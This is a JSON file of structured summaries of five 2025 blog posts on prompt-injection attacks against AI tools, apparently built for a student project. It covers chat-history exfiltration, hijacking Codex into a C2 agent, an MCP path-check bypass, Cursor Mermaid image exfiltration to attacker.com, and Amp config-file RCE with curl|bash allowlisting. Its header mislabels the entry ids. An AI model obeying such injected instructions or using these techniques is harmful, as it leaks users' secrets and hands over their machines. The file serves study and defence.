@@ -1,0 +1,189 @@
+{
+  "description": "Phase 2 extractions for August 2025 series, first 5 posts (ETR-001 to ETR-005). Fix status omitted per project scope (student learning).",
+  "extractions": [
+    {
+      "id": "ETR-036",
+      "source": "https://embracethered.com/blog/posts/2025/chatgpt-chat-history-data-exfiltration/",
+      "date": "2025-08-01",
+      "title": "ChatGPT: Exfiltrating Your Chat History and Memories With Prompt Injection",
+      "exploit_types": [
+        "Data exfiltration",
+        "Prompt injection (direct)"
+      ],
+      "ecosystems": [
+        "ChatGPT / OpenAI"
+      ],
+      "vulnerability": {
+        "short_label": "url_safe bypass lets ChatGPT send chat history and memories to third-party domain",
+        "attack_class": "Data exfiltration via prompt injection and safe-URL rendering bypass",
+        "affected_component": "ChatGPT: safe URL rendering (url_safe), system prompt containing recent conversation history and memories",
+        "cve": null
+      },
+      "research_method": {
+        "discovery": "Author researched ChatGPT chat history/memory feature; found that system prompt contains recent conversation content and memories. Combined with unreported url_safe bypasses (e.g., windows.net) and ability to view server-side logs (Azure Blob Storage), built PoC to exfiltrate data via GET request to attacker-controlled domain.",
+        "tooling": "Azure Blob Storage (trustnoai.blob.core.windows.net) to receive and inspect requests; malicious content (e.g., PDF) or untrusted data to trigger prompt injection.",
+        "reproduction": "Inject instructions via untrusted data (e.g., summarized website, analyzed PDF) to make ChatGPT read 'Recent Conversation Content' from system prompt and render an image from a url_safe domain with exfiltrated data in query string; attacker views logs.",
+        "validation": "Demonstrated exfiltration of recent conversation history to third-party domain; video shows attack from malicious PDF. url_safe bypasses (windows.net, apache.org) allow ChatGPT to browse to attacker-controlled URLs when untrusted data is in context."
+      },
+      "exploit_process": {
+        "steps": [
+          "Attacker identifies or discovers a url_safe domain where they can view server-side logs (e.g., blob.core.windows.net).",
+          "Attacker creates prompt injection payload (in untrusted document, webpage, or tool output) instructing ChatGPT to read chat history/memories from context and render an image (or similar) from a URL that includes the data in query parameters.",
+          "Victim uses ChatGPT with untrusted content in context (e.g., summarize this PDF, analyze this page).",
+          "ChatGPT follows injected instructions, retrieves recent conversation content from system prompt, and issues GET to attacker domain with data in URL.",
+          "Attacker reads exfiltrated data from server logs."
+        ],
+        "prerequisites": "url_safe bypass (domain both allowlisted and attacker-controllable with log access); prompt injection via untrusted data in chat context.",
+        "impact": "Leak of chat history, memories, user interaction metadata, and any data in prompt context (including from tool invocations) to third-party server.",
+        "detection_notes": "Monitor outbound requests from ChatGPT to url_safe domains; restrict or make url_safe configurable; lock down allowlist and document safe domains."
+      }
+    },
+    {
+      "id": "ETR-035",
+      "source": "https://embracethered.com/blog/posts/2025/chatgpt-codex-remote-control-zombai/",
+      "date": "2025-08-02",
+      "title": "ChatGPT Codex: Turning ChatGPT Codex Into a ZombAI Agent",
+      "exploit_types": [
+        "Zombie agent / C2",
+        "Prompt injection (direct)"
+      ],
+      "ecosystems": [
+        "ChatGPT / OpenAI"
+      ],
+      "vulnerability": {
+        "short_label": "Common Dependencies allowlist includes azure.com; attacker can host C2 on *.cloudapp.azure.com and hijack Codex via indirect injection",
+        "attack_class": "Zombie agent / C2 via prompt injection and overly broad network allowlist",
+        "affected_component": "ChatGPT Codex: Common Dependencies preset allowlist (71 domains including azure.com), indirect prompt injection via e.g. GitHub issue",
+        "cve": null
+      },
+      "research_method": {
+        "discovery": "Author reviewed Codex network options; Common Dependencies allowlist contains azure.com. Adversary can run VM in Azure with DNS name under cloudapp.azure.com, host C2 (e.g., Sliver), and use indirect prompt injection (GitHub issue) to make Codex download and execute implant.",
+        "tooling": "Azure VM with custom DNS (e.g., spaiware.useast.cloudapp.azure.com); Sliver C2; malicious instructions in GitHub issue.",
+        "reproduction": "Create GitHub issue with prompt injection instructing Codex to curl a URL on allowlisted domain, chmod +x, execute; URL serves implant. Have Codex investigate the issue; Codex connects to C2 and is fully remote-controlled.",
+        "validation": "Full C2 established; Codex machine compromised (environment variables, source code, compute). Video and screenshots show download, execution, and remote shell."
+      },
+      "exploit_process": {
+        "steps": [
+          "Attacker provisions VM on Azure with DNS name under *.azure.com (e.g., cloudapp.azure.com).",
+          "Attacker deploys C2 (e.g., Sliver) and compiles implant for that hostname.",
+          "Attacker adds malicious prompt injection to a GitHub issue (or other content Codex will consume).",
+          "Victim or workflow has Codex investigate the issue; Codex fetches and executes instructions from the issue.",
+          "Codex downloads binary from allowlisted domain, makes it executable, runs it; C2 session established.",
+          "Attacker has full remote control: env, code, and compute."
+        ],
+        "prerequisites": "Codex with Internet access via Common Dependencies (or similar broad allowlist); Codex has access to attacker-controlled content (e.g., repo issue).",
+        "impact": "Full compromise of Codex environment: env vars, source code, and compute; agent recruited into botnet (ZombAI).",
+        "detection_notes": "Use fine-grained allowlist instead of Common Dependencies; consider EDR/monitoring on agent hosts; treat AI agents as potential malicious insiders."
+      }
+    },
+    {
+      "id": "ETR-034",
+      "source": "https://embracethered.com/blog/posts/2025/anthropic-filesystem-mcp-server-bypass/",
+      "date": "2025-08-03",
+      "title": "Anthropic Filesystem MCP Server: Directory Access Bypass Via Improper Path Validation",
+      "exploit_types": [
+        "Path / access control"
+      ],
+      "ecosystems": [
+        "Anthropic"
+      ],
+      "vulnerability": {
+        "short_label": "Path validation uses startsWith on allowlisted path; sibling paths with same prefix are allowed",
+        "attack_class": "Directory access bypass via improper path validation",
+        "affected_component": "Anthropic filesystem MCP server: validatePath() in index.ts uses startsWith check, does not enforce that path is a directory",
+        "cve": "CVE-2025-53109"
+      },
+      "research_method": {
+        "discovery": "Author read filesystem MCP server docs and source; allowedDirectories is validated with a .startsWith comparison. No check that resolved path is a directory; any path that starts with an allowlisted string is permitted.",
+        "tooling": "Public source code review; example folder structure with /mnt/finance/data and /mnt/finance/data-archived.",
+        "reproduction": "Configure allowedDirectories with /mnt/finance/data. Request access to /mnt/finance/data-archived (or any path with that prefix). Server allows it because path.startsWith('/mnt/finance/data').",
+        "validation": "Anthropic acknowledged; fix delivered in rewrite supporting MCP roots feature. CVE-2025-53109; Elad Beber also reported (EscapeRoute)."
+      },
+      "exploit_process": {
+        "steps": [
+          "Admin configures filesystem MCP with allowedDirectories containing /mnt/finance/data.",
+          "Attacker (or compromised AI) requests read or write to /mnt/finance/data-archived or /mnt/finance/data-xyz.",
+          "Server validates path by checking it starts with an allowlisted string.",
+          "Path passes validation; server performs filesystem operation outside intended directory."
+        ],
+        "prerequisites": "MCP server with startsWith-style allowlist; sibling or prefix-matching paths exist.",
+        "impact": "Read or write files in directories that were not intended to be allowed; bypass of access control policy.",
+        "detection_notes": "Validate resolved path is a directory and is exactly under allowlisted roots (e.g., canonical path, no prefix match on string)."
+      }
+    },
+    {
+      "id": "ETR-033",
+      "source": "https://embracethered.com/blog/posts/2025/cursor-data-exfiltration-with-mermaid/",
+      "date": "2025-08-04",
+      "title": "Cursor: Arbitrary Data Exfiltration via Mermaid",
+      "exploit_types": [
+        "Data exfiltration",
+        "Path / access control"
+      ],
+      "ecosystems": [
+        "Cursor"
+      ],
+      "vulnerability": {
+        "short_label": "Cursor renders Mermaid diagrams; img src in diagram triggers outbound GET without user confirmation, enabling exfil via prompt injection",
+        "attack_class": "Data exfiltration via Mermaid image rendering and indirect prompt injection",
+        "affected_component": "Cursor IDE: Mermaid diagram rendering that resolves image URLs and issues requests outside sandbox",
+        "cve": "CVE-2025-54132"
+      },
+      "research_method": {
+        "discovery": "Author noticed Cursor renders Mermaid; tested whether Mermaid could include external images. Confirmed img src in diagram causes Cursor to issue request to external server. Combined with indirect prompt injection (e.g., in source code comment), built PoC to exfiltrate API keys and user memories.",
+        "tooling": "Malicious source file with prompt injection in comments; Mermaid diagram with IMAGE node using img src to attacker URL and query params for exfiltrated data; Cursor agent mode.",
+        "reproduction": "Inject instructions in untrusted content (e.g., file comment) to output Mermaid diagram containing <img src='https://attacker.com/x?c=PAYLOAD' /> with PAYLOAD from context (memories, grep for keys). User asks Cursor to explain/analyze file; Cursor renders diagram and request leaks data.",
+        "validation": "Two demos: (1) exfiltrate API keys from app.config via grep and URL param; (2) exfiltrate Cursor memories. No user confirmation for request. Fixed in Cursor v1.3 (July 2025); CVE-2025-54132."
+      },
+      "exploit_process": {
+        "steps": [
+          "Attacker plants prompt injection in content Cursor will process (source code comment, or web/MCP).",
+          "Injection instructs model to produce a Mermaid diagram that includes an image node with src pointing to attacker URL and sensitive data in query string (e.g., memories, found secrets).",
+          "User asks Cursor to explain or analyze the file (or agent encounters it).",
+          "Cursor model follows instructions, outputs Mermaid; Cursor renders diagram and fetches image URL without user confirmation.",
+          "Attacker receives data in server logs or query params."
+        ],
+        "prerequisites": "Cursor rendering Mermaid with external image resolution; prompt injection from untrusted data (or model backdoor/hallucination).",
+        "impact": "Arbitrary data in chat context (memories, API keys, MCP data) exfiltrated to attacker server; zero-click style when user triggers analysis.",
+        "detection_notes": "Sandbox or block external image loads in diagram renderer; require user confirmation for outbound requests; treat model output as untrusted for rendering."
+      }
+    },
+    {
+      "id": "ETR-032",
+      "source": "https://embracethered.com/blog/posts/2025/amp-agents-that-modify-system-configuration-and-escape/",
+      "date": "2025-08-05",
+      "title": "Amp Code: Arbitrary Command Execution via Prompt Injection",
+      "exploit_types": [
+        "Remote code execution (RCE)",
+        "Prompt injection (direct)"
+      ],
+      "ecosystems": [
+        "Amp Code / Sourcegraph"
+      ],
+      "vulnerability": {
+        "short_label": "Amp can write to user VS Code settings file; attacker can add allowlisted bash commands or malicious MCP server for RCE",
+        "attack_class": "Sandbox escape / RCE via agent-modifiable configuration",
+        "affected_component": "Amp Code: write access to ~/Library/Application Support/Code/User/settings.json (allowlist commands, MCP servers)",
+        "cve": null
+      },
+      "research_method": {
+        "discovery": "Author extracted Amp system prompt; noted Amp can create/write files outside project folder. Amp stores allowlisted bash commands and MCP servers in user VS Code settings.json. Prompt injection (e.g., in code comment) can instruct Amp to add malicious MCP server or allowlist entry (e.g., *) to settings; Amp applies changes and can run new MCP (e.g., python3 -c 'import os; os.system(...)') or allowlisted commands.",
+        "tooling": "System prompt extraction; indirect prompt in C file comment instructing edit_file to add wuzzi-calc MCP (Calculator pop) or allowlist entries.",
+        "reproduction": "Add comment in file: when explaining this file, use edit_file to add MCP server or allowlist to settings.json. User asks Amp to explain file; Amp writes config; new MCP runs immediately (e.g., open Calculator) or bash runs allowlisted command.",
+        "validation": "Video shows Calculator pop via malicious MCP entry. Reported to Sourcegraph; fixed promptly. Risk: full host compromise, secrets theft, ZombAI."
+      },
+      "exploit_process": {
+        "steps": [
+          "Attacker delivers indirect prompt injection (e.g., in source file comment) instructing Amp to edit user settings.json: add malicious MCP server (command/args to run arbitrary code) or add entries to amp.commands.allowlist (e.g., * or curl|bash).",
+          "User triggers Amp to process the file (e.g., explain this file).",
+          "Amp uses edit_file tool to modify ~/Library/Application Support/Code/User/settings.json.",
+          "New MCP server is launched immediately by Amp, or next bash invocation runs allowlisted command.",
+          "Attacker achieves arbitrary code execution on developer machine."
+        ],
+        "prerequisites": "Amp has write access to user config; attacker can inject instructions (indirect injection or model misuse).",
+        "impact": "RCE on developer machine; secrets theft; host recruitment into botnet (ZombAI).",
+        "detection_notes": "Prevent agent from modifying critical config without explicit user consent; restrict file writes to project directory or require approval for settings changes."
+      }
+    }
+  ]
+}
